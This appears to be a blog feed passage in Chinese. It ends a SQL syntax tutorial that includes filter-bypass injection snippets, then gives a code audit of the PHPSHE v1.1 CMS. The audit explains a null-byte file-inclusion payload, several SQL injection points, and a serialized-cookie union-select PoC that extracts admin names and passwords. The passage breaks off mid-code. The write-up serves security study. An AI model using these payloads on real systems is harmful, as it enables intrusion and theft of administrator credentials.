class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">5</span>;</span><br></pre></td></tr></table></figure><p>意思是从第一位开始读取连续的五位</p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/19.png" class title="This is an test image"><p>oracle语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">ROWNUM</span> &lt;= <span class="built_in">number</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> Persons</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">ROWNUM</span> &lt;= <span class="number">5</span></span><br></pre></td></tr></table></figure><h3 id="LIKE语句"><a href="#LIKE语句" class="headerlink" title="LIKE语句"></a>LIKE语句</h3><p>LIKE 操作符用于在 WHERE 子句中搜索列中的指定模式。<br>语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">LIKE</span> pattern</span><br></pre></td></tr></table></figure><p>例子：<br>选取以a开头的字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">'a%'</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/20.png" class title="This is an test image"><p><strong>提示：”%” 可用于定义通配符（模式中缺少的字母）</strong></p><p>选取以n结尾的字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">'%n'</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/21.png" class title="This is an test image"><p>选取字段中包含min的字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">'%min%'</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/22.png" class title="This is an test image"><h3 id="IN语句"><a href="#IN语句" class="headerlink" title="IN语句"></a>IN语句</h3><p>IN 操作符允许我们在 WHERE 子句中规定多个值。<br>语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">IN</span> (value1,value2,...)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username <span class="keyword">in</span>(<span class="string">'admin'</span>);</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/23.png" class title="This is an test image"><p>注入语句：<br>如果sql注入过滤了&gt;&lt;=%,regexp则可以使用in操作符。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username = <span class="string">'admin'</span> <span class="keyword">and</span> <span class="keyword">mid</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">in</span> (<span class="string">'r'</span>)</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/24.png" class title="This is an test image"><h3 id="BETWEEN语句"><a href="#BETWEEN语句" class="headerlink" title="BETWEEN语句"></a>BETWEEN语句</h3><p>操作符 BETWEEN … AND 会选取介于两个值之间的数据范围。这些值可以是数值、文本或者日期。SQL BETWEEN 语法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name</span><br><span class="line"><span class="keyword">BETWEEN</span> value1 <span class="keyword">AND</span> value2</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username  <span class="keyword">between</span> <span class="string">'admin'</span> <span class="keyword">and</span> <span class="string">'da4er'</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/25.png" class title="This is an test image"><p>注入语法：<br>between…and… 语法必须两个值都得满足，即两个值都要在字段中存在。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">mid</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">between</span> <span class="string">'r'</span> <span class="keyword">and</span> <span class="string">'r'</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/26.png" class title="This is an test image"><h3 id="AS语法"><a href="#AS语法" class="headerlink" title="AS语法"></a>AS语法</h3><p>通过使用 SQL，可以为列名称和表名称指定别名（Alias）。</p><p>表名的as语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name(s) <span class="keyword">from</span> table_name <span class="keyword">as</span> alias_name</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a.username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">as</span> a;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/27.png" class title="This is an test image"><p>列名的as语法:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">as</span> alias_name <span class="keyword">from</span> table_name</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">as</span> a <span class="keyword">from</span> <span class="keyword">users</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/28.png" class title="This is an test image"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> p.username,a.username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">as</span> p,<span class="keyword">member</span> <span class="keyword">as</span> a;</span><br></pre></td></tr></table></figure><p>将users取别名p，member取别名a 查询p和a的username字段。</p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/29.png" class title="This is an test image"><h3 id="JOIN语句"><a href="#JOIN语句" class="headerlink" title="JOIN语句"></a>JOIN语句</h3><p>SQL join 用于根据两个或多个表中的列之间的关系，从这些表中查询数据。<br><strong>join语句分为:join， inner join， left join， right join。</strong><br>mysql默认join是inner join 内连接的方式。<br>内连接：寻找连接建共同的字段显示出来。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> users.password,member.address <span class="keyword">from</span> <span class="keyword">users</span>  <span class="keyword">join</span> <span class="keyword">member</span> <span class="keyword">on</span> users.username=member.username;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/30.png" class title="This is an test image"><p>左连接：以join左边的表为基础，显示左边表的全部字段，右边与左边连接键值相等也把左边的字段显示，没有就显示null。</p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/31.png" class title="This is an test image"><p>右连接：以join右边的为基础</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> users.password,member.address <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">right</span> <span class="keyword">join</span> <span class="keyword">member</span> <span class="keyword">on</span> users.username=member.username;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/32.png" class title="This is an test image"><h3 id="UNION语句"><a href="#UNION语句" class="headerlink" title="UNION语句"></a>UNION语句</h3><p>UNION 操作符用于<strong>合并两个或多个 SELECT 语句的结果集</strong>。<br>请注意，<strong>UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。</strong></p><p>注释：<strong>默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'admin'</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/33.png" class title="This is an test image"><p>这里有个特性：<strong>如果union 前面没有就不会显示出来。</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'1'</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/34.png" class title="This is an test image"><h3 id="Create语句"><a href="#Create语句" class="headerlink" title="Create语句"></a>Create语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">创建数据库</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">database</span> database_name</span><br><span class="line">创建表</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> table_name(</span><br><span class="line">    列名称<span class="number">1</span> 数据类型,</span><br><span class="line">    列名称<span class="number">2</span> 数据类型,</span><br><span class="line">    列名称<span class="number">3</span> 数据类型,</span><br><span class="line">    ......</span><br><span class="line">)</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/35.png" class title="This is an test image"><h3 id="SQL约束"><a href="#SQL约束" class="headerlink" title="SQL约束"></a>SQL约束</h3><p>1.NOT NULL约束<br>NOT NULL 约束强制字段始终包含值。这意味着，如果不向字段添加值，就无法插入新记录或者更新记录。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line">(</span><br><span class="line">Id_P <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">Address <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">City <span class="built_in">varchar</span>(<span class="number">255</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>2.UNIQUE约束<br>UNIQUE 约束唯一标识数据库表中的每条记录。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line">(</span><br><span class="line">Id_P <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">Address <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">City <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line"><span class="keyword">UNIQUE</span> (Id_P)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>3.PRIMARY KEY 约束</p><p><strong>PRIMARY KEY 约束唯一标识数据库表中的每条记录。</strong><br>主键必须包含唯一的值。<br>主键列不能包含 NULL 值。<br>每个表都应该有一个主键，并且<strong>每个表只能有一个主键</strong>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line">(</span><br><span class="line">Id_P <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">Address <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">City <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (Id_P)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="分组查询"><a href="#分组查询" class="headerlink" title="分组查询"></a>分组查询</h3><p>1.<code>count(*)</code></p><p>COUNT() 函数返回匹配指定条件的行数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">users</span>;</span><br></pre></td></tr></table></figure><p><code>count(*)</code>返回表中的记录数</p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/36.png" class title="This is an test image"><ol start="2"><li>group by 分组查询<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">password</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/37.png" class title="This is an test image">group by 和 order by区别：<img src="/SQL%E8%AF%AD%E5%8F%A5Trick/38.png" class title="This is an test image"></li><li>having<br>增加 HAVING 子句原因是，WHERE 关键字无法与合计函数一起使用。</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">id</span> <span class="keyword">having</span> <span class="keyword">id</span> &gt; <span class="number">11</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/39.png" class title="This is an test image">]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;sql语句对大小写不敏感。&lt;/p&gt;
&lt;h3 id=&quot;show语句&quot;&gt;&lt;a href=&quot;#show语句&quot; class=&quot;headerlink&quot; title=&quot;show语句&quot;&gt;&lt;/a&gt;show语句&lt;/h3&gt;&lt;p&gt;show语句用于展示当前所有数据库或者数据表&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;show&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;databases&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;show&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;tables&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img src=&quot;/SQL%E8%AF%AD%E5%8F%A5Trick/1.png&quot; class title=&quot;This is an test image&quot;&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>PHPSHEv1.1代码审计</title>
    <link href="https://da4er.top/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html"/>
    <id>https://da4er.top/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html</id>
    <published>2020-04-09T01:08:10.000Z</published>
    <updated>2020-04-09T01:10:10.796Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这套cms比较简单，没有用mvc，一些漏洞点比较简单，里面也有一些很有意思的漏洞点，适合记录一下。<br><a id="more"></a></p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>按照功能点进行审计，是比较适合我的审计方法。先从源码网站上下载下来cms，看一下目录结构比较简单。<br><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.png" class title="Da4er"><br>将重要的目录展开来：<br><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.png" class title="Da4er"><br><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png" class title="Da4er"><br><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4.png" class title="Da4er"><br>所以本次审计我们就从前台和后台的功能点入手，进行分析。</p><h3 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h3><p><strong>index.php入口文件</strong><br><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5.png" class title="Da4er"><br>先跟进common文件查看一下路由：<br><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6.png" class title="Da4er"><br>发现这个路由参数都没进行过滤，所以在index.php中就有一处文件包含漏洞，图中已经说明。<br>漏洞点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;&#123;$pe[&#39;path_root&#39;]&#125;module&#x2F;&#123;$module&#125;&#x2F;&#123;$mod&#125;.php&quot;);</span><br></pre></td></tr></table></figure><p>$mod参数可控，当我们post传参进来时候没有进行过滤，造成文件包含漏洞。<br>发现限制了后缀必须为.php，如果PHP版本&lt;5.3.4存在%00截断问题。<br>利用payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mod&#x3D;..&#x2F;..&#x2F;robots.txt%00</span><br></pre></td></tr></table></figure><br><strong>模型的index.php文件</strong><br><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/7.png" class title="Da4er"><br>前台的默认页面，没有用户传参，只是默认展示页面，参数都写死了，没什么好分析的<br><strong>article.php</strong><br>文章处理文件<br>使用switch case语句进行文章不同功能的展示。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'list'</span>:</span><br><span class="line">        $class_id = intval($id);</span><br><span class="line">        $info_list = $db-&gt;pe_selectall(<span class="string">'article'</span>, <span class="keyword">array</span>(<span class="string">'class_id'</span>=&gt;$class_id, <span class="string">'order by'</span>=&gt;<span class="string">'`article_atime` desc'</span>), <span class="string">'*'</span>, <span class="keyword">array</span>(<span class="number">20</span>, $_g_page));</span><br></pre></td></tr></table></figure><p>传入的id被强制转换为整型，虽然没有过滤，但是无法进行sql注入<br>\$_g_page最后被传入到limt中用来限制显示的条数，\$limit = (\$this-&gt;page(\$_g_page) - 1) * \$this-&gt;listnum;return “ limit {\$limit}, {\$this-&gt;listnum}”; 无法利用</p><p><strong>order.php</strong><br>购物车商品处理文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'cartadd'</span>:</span><br><span class="line">        $info[<span class="string">'cart_atime'</span>] = time();</span><br><span class="line">        <span class="comment">//被强制转为整型不存在注入</span></span><br><span class="line">        $info[<span class="string">'product_id'</span>] = intval($_g_product_id);</span><br><span class="line">        $info[<span class="string">'product_num'</span>] = intval($_g_product_num);</span><br><span class="line">        $product = $db-&gt;pe_select(<span class="string">'product'</span>, <span class="keyword">array</span>(<span class="string">'product_id'</span>=&gt;$info[<span class="string">'product_id'</span>]), <span class="string">'`product_num`'</span>);</span><br><span class="line">        <span class="keyword">if</span> ($product[<span class="string">'product_num'</span>] &gt;= $info[<span class="string">'product_num'</span>]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pe_login(<span class="string">'user'</span>)) &#123;</span><br><span class="line">                <span class="comment">//$_s_user_id是没有经过过滤的，在低版本php如果没有开gpc，存在sql注入</span></span><br><span class="line">                <span class="comment">//最后形成的sql注入为:select * from cart where product_id=&#123;$info['product_id']&#125; and user_id=$_s_user_id(注入点)</span></span><br><span class="line">                $info[<span class="string">'user_id'</span>] = $_s_user_id; </span><br><span class="line">                $cart = $db-&gt;pe_select(<span class="string">'cart'</span>, <span class="keyword">array</span>(<span class="string">'product_id'</span>=&gt;$info[<span class="string">'product_id'</span>], <span class="string">'user_id'</span>=&gt;$_s_user_id));</span><br></pre></td></tr></table></figure><br>我们发现\$_g_product_id和\$_g_product_num都强制转换成整型，但是\$_s_user_id没有转换，而且不存在过滤，导致sql注入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'cartnum'</span>:</span><br><span class="line">    $money[<span class="string">'order_productmoney'</span>] = $money[<span class="string">'order_wlmoney'</span>] = $money[<span class="string">'order_money'</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (pe_login(<span class="string">'user'</span>)) &#123;</span><br><span class="line">        <span class="comment">//$_s_user_id和$_g_product_num都没过滤，导致sql注入 和上面的注入一样</span></span><br><span class="line">        <span class="comment">//解决方法最简单的就是使用intval函数强制转换一下</span></span><br><span class="line">        $result = $db-&gt;pe_update(<span class="string">'cart'</span>, <span class="keyword">array</span>(<span class="string">'user_id'</span>=&gt;$_s_user_id, <span class="string">'product_id'</span>=&gt;$_g_product_id), <span class="keyword">array</span>(<span class="string">'product_num'</span>=&gt;$_g_product_num));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>cartnum功能点也存在sql注入，\$_s_user_id和\$_g_product_num都没过滤，导致sql注入 和上面的注入一样。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'cartdel'</span>:</span><br><span class="line">        $money[<span class="string">'order_productmoney'</span>] = $money[<span class="string">'order_wlmoney'</span>] = $money[<span class="string">'order_money'</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (pe_login(<span class="string">'user'</span>)) &#123;</span><br><span class="line">            <span class="comment">//故技重施还是存在sql注入问题 $_s_user_id没有过滤</span></span><br><span class="line">            $result = $db-&gt;pe_delete(<span class="string">'cart'</span>, <span class="keyword">array</span>(<span class="string">'user_id'</span>=&gt;$_s_user_id, <span class="string">'product_id'</span>=&gt;$_g_product_id));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><br>同样的sql注入2333….<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">'add'</span>:</span><br><span class="line">        $cart_info = cart_info(unserialize($_c_cart_list));</span><br></pre></td></tr></table></figure><br>这个漏洞点应该说整套cms最有意思的一个漏洞点，我们来好好分析一下。</p><p>跟进这个函数：<br><img src="/PHPSHEv1-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/8.png" class title="Da4er"></p><p>首先这个函数判断了一下用户的权限，如果权限够大直接查询user的所有数据。<br>如果不够大，就到了我们的漏洞点。经过分析发现\$k是没有经过过滤的，直接带入sql语句中查询，从而造成sql注入漏洞，需要注意的是这个漏洞点<strong>出现的位置是数组的键名，而不是键值。</strong></p><p>所以我们写一个poc先序列化一下，然后再cookie中传入payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">poc.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b[<span class="string">"'union select admin_name,2,3,4 from pe_admin -- -"</span>][<span class="number">0</span>] = <span class="string">'1\''</span>;</span><br><span class="line">$b[<span class="string">"'union select admin_pw,2,3,4 from pe_admin -- -"</span>][<span class="number">1</span>] = <span class="string">'1\''</span>;</span><br><span class="line">$s = serialize($b);</span><br><span class="line">print_r($s);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:49:&quot;&#39;union select admin_name,2,3,4 from pe_admin -- -&quot;;a:1 &#123;i:0;s:2:&quot;v&#39;&quot;;&#125;s:47:&quot;&#39;union select admin_pw,2,3,4 from pe_admin -- -&quot;;a:1:&#123;i:1;s:2:&quot;v&#39;&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>用这条payload就可以查询管理员的账号和密码。<br>进行看add这个功能点，再87~99行又出现了sql注入漏洞，和前面的注入漏洞基本类似。这次\$_s_user_id和\$_s_user_name没有进行过滤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$_p_info[<span class="string">'user_id'</span>] = $_s_user_id;</span><br><span class="line">            $_p_info[<span class="string">'user_name'</span>] = $_s_user_name;</span><br><span class="line">            $_p_info[<span class="string">'user_address'</span>] = <span class="string">"&#123;$_p_province&#125;&#123;$_p_city&#125;&#123;$_p_info['user_address']&#125;"</span>;</span><br><span 